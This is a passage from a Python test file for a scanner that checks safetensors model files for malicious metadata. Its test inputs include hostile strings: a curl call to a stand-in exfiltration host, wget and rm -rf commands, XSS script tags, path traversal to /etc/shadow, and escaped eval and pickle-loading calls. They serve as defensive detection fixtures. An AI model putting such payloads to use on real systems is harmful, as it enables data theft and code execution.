    header_str = '{"a":' * depth + "{}" + "}" * depth
    header_bytes = header_str.encode("utf-8")

    file_path = tmp_path / "deep.safetensors"
    with open(file_path, "wb") as f:
        f.write(struct.pack("<Q", len(header_bytes)))
        f.write(header_bytes)
        f.write(b"\x00")

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.has_errors or result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    # Check that either RecursionError was caught OR the header was marked as invalid/deeply nested
    # Also check for generic JSON error since deeply nested JSON might fail differently
    # Include tensor validation errors as acceptable since deeply nested but valid JSON
    # will parse successfully but create invalid SafeTensors structure
    assert any(
        (check.details and check.details.get("exception_type") == "RecursionError")
        or "deeply nested" in check.message.lower()
        or "recursion" in check.message.lower()
        or "invalid json" in check.message.lower()
        or "offsets out of bounds" in check.message.lower()  # Acceptable for this test
        or "invalid data_offsets structure" in check.message.lower()
        for check in result.checks
    )


def test_suspicious_metadata(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"info": "wget http://malicious"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert any("suspicious metadata" in issue.message.lower() for issue in result.issues)
    assert "suspicious_pattern" in result.metadata["custom_metadata_security_flags"]


def test_unicode_metadata_is_not_code_injection(tmp_path: Path) -> None:
    file_path = tmp_path / "unicode_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"description": "café model trained on multilingual text 日本語"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks == []
    assert result.metadata["custom_metadata_security_flags"] == []
    assert [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}] == []


@pytest.mark.parametrize(
    "value",
    [
        "configuration=enabled",
        "versioning=enabled",
        "<div online=true>",
        "<span only=one>",
        "encoded with base64.urlsafe_b64encode",
        "serialized with pickle.dumps for documentation",
        "serialized with marshal.dumps for documentation",
    ],
)
def test_benign_metadata_references_are_not_injection_patterns(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "benign_reference_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"description": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [
        check
        for check in result.checks
        if check.name in {"SafeTensors XSS/HTML Injection Detection", "SafeTensors Code Injection Detection"}
        and check.status == CheckStatus.FAILED
    ]


@pytest.mark.parametrize(
    "value",
    [
        "<script src=https://evil.example/payload.js>",
        "<div onclick=alert(1)>",
        "<body onload=run()>",
        "onclick=alert(1)",
        "onload = run()",
    ],
)
def test_open_html_injection_flags_xss(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "open_script_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"description": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert "xss_html_injection" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "SafeTensors XSS/HTML Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "value",
    [
        "base64.b64decode(payload)",
        "pickle.loads(payload)",
        "marshal.loads(payload)",
    ],
)
def test_executable_decoder_and_loader_calls_flag_code_injection(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "executable_loader_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"payload": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert "code_injection" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "SafeTensors Code Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_literal_unicode_escape_metadata_still_flags_code_injection(tmp_path: Path) -> None:
    file_path = tmp_path / "escaped_payload_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"payload": r"\u0065\u0076\u0061\u006c\u0028"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks
    assert all(check.severity == IssueSeverity.CRITICAL for check in code_injection_checks)
    assert "code_injection" in result.metadata["custom_metadata_security_flags"]


def test_single_comment_token_does_not_bypass_unicode_escape_detection(tmp_path: Path) -> None:
    file_path = tmp_path / "commented_escape_payload_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"payload": r"\u0065#\u0076\u0061\u006c\u0028"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks
    assert all(check.severity == IssueSeverity.CRITICAL for check in code_injection_checks)


def test_safetensors_benign_path_like_metadata_not_flagged(tmp_path: Path) -> None:
    """Benign path references in metadata should not be treated as traversal."""
    file_path = tmp_path / "benign_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {
        "source_path": "/home/alice/model-cache/run-1",
        "root_copy": "/root/.cache/model.bin",
        "win_path": r"C:\Users\alice\models\weights.safetensors",
        "encoded_path": "%2Fhome%2Falice%2Fworkspace%2Fmodel.bin",
    }
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    assert not [
        check
        for check in result.checks
        if check.name == "SafeTensors Path Traversal Detection" and check.status == CheckStatus.FAILED
    ]
    assert not [
        check
        for check in result.checks
        if check.name == "Metadata Code Pattern Check" and check.status == CheckStatus.FAILED
    ]


def test_safetensors_traversal_metadata_still_detected(tmp_path: Path) -> None:
    """Relative and URL-encoded traversal metadata should still be reported."""
    file_path = tmp_path / "traversal_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {
        "payload_path": "../tmp/../../payload.bin",
        "encoded_payload": "%2E%2e/%2e%2e/etc/shadow",
    }
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    traversal_checks = [
        check
        for check in result.checks
        if check.name == "SafeTensors Path Traversal Detection" and check.status == CheckStatus.FAILED
    ]
    assert traversal_checks
    assert any((check.details or {}).get("attack_type") == "path_traversal" for check in traversal_checks)


def test_metadata_windows_drive_path_no_code_pattern_false_positive(tmp_path: Path) -> None:
    """Windows path separators alone should not trip the metadata code-pattern check."""
    file_path = tmp_path / "windows_path_only.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"artifact": r"D:\models\artifact\run.bin"}
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    assert not [
        check
        for check in result.checks
        if check.name == "Metadata Code Pattern Check" and check.status == CheckStatus.FAILED
    ]


def test_mixed_suspicious_patterns(tmp_path: Path) -> None:
    """Test that both simple patterns and regex patterns are detected from the same metadata value."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Metadata containing both simple pattern (import) and regex pattern (URL)
    metadata = {"malicious_code": "import os; os.system('curl https://malicious.example.com/exfiltrate')"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    # Should detect BOTH the import pattern AND the URL pattern
    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should have detected at least 2 issues: one for import, one for URL
    assert len(suspicious_issues) >= 2, (
        f"Expected at least 2 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Verify that different types of issues are detected
    issue_messages = [issue.why for issue in suspicious_issues if issue.why]

    # Should have both simple pattern detection and regex pattern detection
    has_code_pattern = any("code-like patterns" in msg for msg in issue_messages)
    has_regex_pattern = any("suspicious pattern" in msg for msg in issue_messages)

    assert has_code_pattern, "Should detect import statement as code-like pattern"
    assert has_regex_pattern, "Should detect URL as regex-based suspicious pattern"


def test_multiple_distinct_patterns(tmp_path: Path) -> None:
    """Test detection of multiple different types of suspicious patterns."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Multiple metadata fields with different suspicious patterns
    metadata = {
        "setup": "rm -rf /tmp/test",  # Shell command (regex pattern)
        "code": "import subprocess",  # Import statement (simple pattern)
        "callback": "https://evil.com/exfiltrate",  # URL (regex pattern)
        "script": "<script>alert('xss')</script>",  # Script injection (regex pattern)
    }
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should detect issues for each metadata field
    assert len(suspicious_issues) >= 4, (
        f"Expected at least 4 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Check that different metadata keys are flagged
    flagged_keys = set()
    for issue in suspicious_issues:
        # Extract key name from message like "Suspicious metadata value for setup"
        if "for " in issue.message:
            key = issue.message.split("for ")[-1]
            flagged_keys.add(key)

    expected_keys = {"setup", "code", "callback", "script"}
    assert flagged_keys.issuperset(expected_keys), (
        f"Expected all keys {expected_keys} to be flagged, got {flagged_keys}"
    )
